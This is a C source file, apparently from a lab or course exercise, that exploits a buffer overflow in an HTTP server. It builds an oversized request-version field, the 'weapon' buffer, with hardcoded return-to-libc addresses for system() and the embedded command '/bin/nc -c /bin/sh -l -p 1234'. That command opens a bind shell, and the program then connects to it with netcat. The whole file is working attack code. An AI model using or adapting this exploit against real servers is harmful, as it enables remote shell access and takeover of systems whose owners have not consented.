#define _GNU_SOURCE 1
#define _XOPEN_SOURCE 700
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

static int connect_to(const char *hostname, const char *port)
{
	struct addrinfo hints;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = PF_INET;
	hints.ai_socktype = SOCK_STREAM;

	struct addrinfo *start;
	int ret = getaddrinfo(hostname, port, &hints, &start);
	if (ret != 0)
		return -1;
	int sock = -1;
	struct addrinfo *info;
	for (info = start; info; info = info->ai_next)
	{
		sock = socket(info->ai_family, info->ai_socktype,
			      info->ai_protocol);
		if (sock == -1)
			continue;

		if (connect(sock, info->ai_addr, info->ai_addrlen) != -1)
			break;
		close(sock);
		sock = -1;
	}
	freeaddrinfo(start);
	return sock;
}

/* This sends len bytes of data over the socket. It will call send(2)
 * over and over until one of the following happens:
 * - All of the data has been sent in which case it returns len;
 * - An error occurs in which case it returns -1; or
 * - The socket is closed in which case it returns the amount sent.
 * This does _not_ work with nonblocking sockets. */
static ssize_t sendn(int sock, const void *data, size_t len)
{
	ssize_t total = 0;
	while (len)
	{
		ssize_t amount = send(sock, data, len, 0);
		if (amount == -1 && errno == EINTR)
			continue;
		if (amount == -1)
			return -1;
		if (amount == 0)
			break;
		data += amount;
		len -= amount;
		total += amount;
	}
	return total;
}
/*
static void recv_response(int sock)
{
	char buf[4096];

	while (1)
	{
		ssize_t amount = recv(sock, buf, sizeof buf, 0);
		if (amount == -1 && errno == EINTR)
			continue;
		if (amount <= 0)
			return;
		write(fileno(stdout), buf, amount);
	}
}
*/
int main(int argc, char *argv[])
{

	
/*	if (argc != 4)
	{
		fprintf(stderr, "Usage: %s hostname port file\n", argv[0]);
		return EXIT_FAILURE;
	}
	int sock = connect_to(argv[1], argv[2]);
*/
//	const char* host = "localhost";
//	const char* port = "8080";
	int sock = connect_to(argv[1], argv[2]);
	assert(sock != -1);

	char *request;
	char weapon[600];
	int i;
	for(i = 0; i < 600; i++)
		weapon[i] = ' ';
	memcpy(weapon+568, "/bin/nc -c /bin/sh -l -p 1234 #", 31);
/*	weapon[122] = 0xf0;	//parameter to system
	weapon[123] = 0xe9;
	weapon[124] = 0xff;
	weapon[125] = 0xbf;
*/
	weapon[114] = 0xb0;	//seip,system
	weapon[115] = 0xe1;
	weapon[116] = 0xec;
	weapon[117] = 0xb7;

	weapon[118] = 0x20;	//fd, return of system
	weapon[119] = 0x43;
	weapon[120] = 0xec;
	weapon[121] = 0xb7;

	weapon[122] = 0x44;	//parameter of system
	weapon[123] = 0xeb;
	weapon[124] = 0xff;
	weapon[125] = 0xbf;

	printf("redirecting to address: %hhx%hhx%hhx%hhx\n", weapon[125], weapon[124], weapon[123], weapon[122]);
	
	weapon[126] = 0xf1;	//arg_8,int
	weapon[127] = 0xf9;
	weapon[128] = 0xff;
	weapon[129] = 0xbf;

	weapon[130] = 0x10; 	//arg_c,int
	weapon[131] = 0xff;
	weapon[132] = 0xff;
	weapon[133] = 0xbf;
//	memcpy(weapon+120, "/xc8/xff/xff/xbf", 4);
//	memcpy(weapon+124, "/xd9/xfc/xff/xbf/xe9/xff/xff/xbf", 8);
	weapon[599] = 0;
	
//	char *addr_ptr;
//	addr_ptr = getenv("HACK");
//	printf("address:%p\n", addr_ptr);

//	recv_response(sock);
	asprintf(&request, "GET %s HTTP/%s\r\nHost: %s\r\n\r\n", "/", weapon, argv[1]);
	sendn(sock, request, strlen(request));
//	free(request);
//	recv_response(sock);
	close(sock);
	sleep(1);
	execl("/bin/nc","bin/nc", "localhost", "1234", NULL);
	free(request);
	_exit(1);
	return 0;
}
